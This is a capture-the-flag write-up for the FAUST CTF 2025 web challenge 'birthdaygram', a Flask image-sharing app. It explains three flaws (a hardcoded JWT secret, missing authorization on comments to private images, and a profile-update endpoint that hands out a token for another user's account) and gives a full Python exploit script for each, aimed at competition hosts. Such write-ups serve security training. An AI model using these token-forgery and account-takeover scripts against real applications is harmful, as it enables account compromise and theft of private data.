---
title: "birthdaygram - FAUST CTF 2025"
category: "web"
subcategory: "jwt"
type: "writeup"
tags: ["web", "python", "jwt", "flask", "zsteg", "base64", "render-template", "subprocess", "faust-ctf", "faust-ctf-2025", "2025", "ctf-writeup"]
summary: "Birthdaygram - a Flask-based web application where users can register, upload images, and interact with other users' content."
source:
  name: "CTFtime writeup #40450"
  url: "https://ctftime.org/writeup/40450"
ctf:
  name: "FAUST CTF 2025"
  year: 2025
  challenge: "birthdaygram"
---

## Metadata

- **CTF:** FAUST CTF 2025
- **Task:** birthdaygram
- **Author team:** SiBears
- **CTFtime tags:** python
- **CTFtime:** <https://ctftime.org/writeup/40450>

---
# Writeup

**Birthdaygram** - a Flask-based web application where users can register, upload images, and interact with other users' content. The service includes user profiles, image feeds, comments, and privacy controls.

### Identified Security Vulnerabilities

1\. #### Hardcoded JWT Secret

**Location**: [app.py](http://app.py) line 23

```  
secret = os.getenv("SECRET")  
```

**Impact**:  
The JWT secret is loaded from environment variables but defaults to a predictable value  
Attackers can generate valid JWT tokens for any user  
Complete authentication bypass

#### Exploit for vulnerability 1:

```python  
#!/usr/bin/env python3

import requests  
import jwt  
import base64  
import sys  
from pwn import *  
import subprocess  
import tempfile  
import os

SECRET = "whoishorton"

def create_admin_jwt(username):  
payload = {"name": username}  
token = jwt.encode(payload, SECRET, algorithm="HS256")  
return token

def exploit_specific_user(username, TARGET_URL):  
session = requests.Session()

try:  
token = create_admin_jwt(username)  
session.cookies.set("session", token)

profile_response = session.get(f"{TARGET_URL}/profile")  
if profile_response.status_code == 200:

view_response = session.get(f"{TARGET_URL}/view/{username}")  
if view_response.status_code == 200:

import re  
image_ids = re.findall(r'/image/(\d+)', view_response.text)

for img_id in set(image_ids):

img_response = session.get(f"{TARGET_URL}/image/{img_id}")  
a = img_response.text.split(":image/png;base64, ")[1].split('" />')[0]  
return a

return None

except Exception as e:  
return None

def zsteg_from_base64(base64_string, output_file=None):

image_data = base64.b64decode(base64_string)

with tempfile.NamedTemporaryFile(delete=False, suffix='.png') as temp_file:  
temp_file.write(image_data)  
temp_file_path = [temp_file.name](http://temp_file.name)

try:  
result = subprocess.run(['zsteg', temp_file_path],   
capture_output=True, text=True)

print(result.stdout, flush=True)

finally:  
os.unlink(temp_file_path)

if __name__ == "__main__":  
ids = sys.argv[1]

ip = f"fd66:666:{ids}::2"  
TARGET_URL = "http://"+f"[{ip}]:"+"3000"   
ii = "<https://2025.faustctf.net/competition/teams.json>"  
r = requests.get(ii)  
try:  
us = r.json()["flag_ids"]["birthdaygram"][str(ids)]

except:  
pass  
for user in us:  
try:  
a = exploit_specific_user(user, TARGET_URL)  
zsteg_from_base64(a, "results.txt")  
except:  
pass

```

2\. #### Broken Access Control in Image Comments

**Location**: /image/<id> POST handler

Missing authorization check for private images

```  
try:   
username = jwt.decode(cookie, secret, algorithms=["HS256"])  
except:  
return redirect("/auth/login")  
try:  
comment = Comments(image=id, comment=comment, creator_name=username.get("name"), timestamp=int(time.time()))  
db.session.add(comment)  
db.session.commit()  
comments = Comments.query.filter(Comments.image == [image.id](http://image.id)).all()  
return render_template('image.html', image=image, comments=comments, cookie=hasCookie(request))  
except:  
return "Error", 500  
```

**Impact**:  
Users can comment on private images they shouldn't have access to  
When commenting, the full image content is returned in the response  
Information disclosure of private images

#### Exploit for vulnerability 2

```python  
#!/usr/bin/env python3  
import requests  
import sys  
import string  
import random  
import re  
import base64  
import subprocess  
import tempfile  
import os

res = requests.Session()  
ids = sys.argv[1]  
ip = f"fd66:666:{ids}::2"  
BASE_URL = "http://"+f"[{ip}]:"+"3000"

def gen(length=8):  
characters = string.ascii_letters + string.digits  
random_string = ''.join(random.choice(characters) for _ in range(length))  
return random_string

def register_user(username, password):  
url = f"{BASE_URL}/auth/register"

data = {  
'username': username,  
'password': password  
}

response = [res.post](http://res.post)(url, data=data)

def login_user(username, password):  
url = f"{BASE_URL}/auth/login"  
data = {  
'username': username,  
'password': password  
}

response = [res.post](http://res.post)(url, data=data, allow_redirects=False)

def zsteg_from_base64(base64_string, output_file=None):  
image_data = base64.b64decode(base64_string)

with tempfile.NamedTemporaryFile(delete=False, suffix='.png') as temp_file:  
temp_file.write(image_data)  
temp_file_path = [temp_file.name](http://temp_file.name)

try:

result = subprocess.run(['zsteg', temp_file_path],   
capture_output=True, text=True)

print(result.stdout,flush=True)

finally:  
os.unlink(temp_file_path)

if __name__ == "__main__":  
usr = gen()  
pas = gen()  
register_user(usr, pas)  
login_user(usr,pas)  
data = {"comment":"aa"}  
r = res.get(BASE_URL+"/feed")

post_ids = re.findall(r'/image/(\d+)', r.text)  
last_post_id = int(post_ids[0])  
for i in range(last_post_id, last_post_id-20, -1):  
r = [res.post](http://res.post)(BASE_URL+"/image/"+f"{i}", data=data)  
base64_images = r.text.split(":image/png;base64, ")[1].split('" />')[0]  
zsteg_from_base64(base64_images, "a.txt")

```

3\. #### Generate a valid JWT for any user via the function Profile Update

**Location**: /updateProfile/<attribute> endpoint

```  
try:   
username = jwt.decode(cookie, secret, algorithms=["HS256"])  
...  
username = username.get("name")  
...  
elif attribute == "username":  
...  
user = User.query.filter(User.username == username).first()  
if user.password != old_password:  
return "Error", 500  
user.username = new_username  
token = jwt.encode({"name": new_username}, secret, algorithm="HS256")  
resp.set_cookie("session", token)  
```

**Impact**:  
The function incorrectly checks the password of the currently logged-in user instead of the target profile owner  
Allows any authenticated user to modify any other user's profile  
Returns a valid JWT token for the hijacked account

#### Exploit for vulnerability 3

```python  
#!/usr/bin/env python3  
import requests  
import base64  
import sys  
import string  
import random  
import re  
import tempfile  
import subprocess

res = requests.Session()  
ids = sys.argv[1]  
ip = f"fd66:666:{ids}::2"  
BASE_URL = "http://"+f"[{ip}]:"+"3000"

def gen(length=8):  
characters = string.ascii_letters + string.digits  
random_string = ''.join(random.choice(characters) for _ in range(length))  
return random_string

def register_user(username, password):  
url = f"{BASE_URL}/auth/register"

data = {  
'username': username,  
'password': password  
}

response = [res.post](http://res.post)(url, data=data)

def login_user(username, password):  
url = f"{BASE_URL}/auth/login"

data = {  
'username': username,  
'password': password  
}  
response = [res.post](http://res.post)(url, data=data, allow_redirects=False)

def zsteg_from_base64(base64_string, output_file=None):  
image_data = base64.b64decode(base64_string)

with tempfile.NamedTemporaryFile(delete=False, suffix='.png') as temp_file:  
temp_file.write(image_data)  
temp_file_path = [temp_file.name](http://temp_file.name)

result = subprocess.run(['zsteg', temp_file_path],  
capture_output=True, text=True)

print(result.stdout, flush=True)

if __name__ == "__main__":  
ii = "<https://2025.faustctf.net/competition/teams.json>"  
r = requests.get(ii)  
try:  
us = r.json()["flag_ids"]["birthdaygram"][str(ids)]  
except:  
exit()  
for username in us:  
usr = gen()  
pas = gen()  
register_user(usr, pas)  
login_user(usr,pas)  
data = {"username":username, "old_password":pas}

r = [res.post](http://res.post)(BASE_URL+f"/updateProfile/username", data=data)

r = res.get(BASE_URL+f"/view/{username}")  
base64_images = re.findall(r'src="data:image/[^;]+;base64,\s*([^"]{1000,})"',r.text)

for i in base64_images:  
zsteg_from_base64(i, "results.txt")  
```
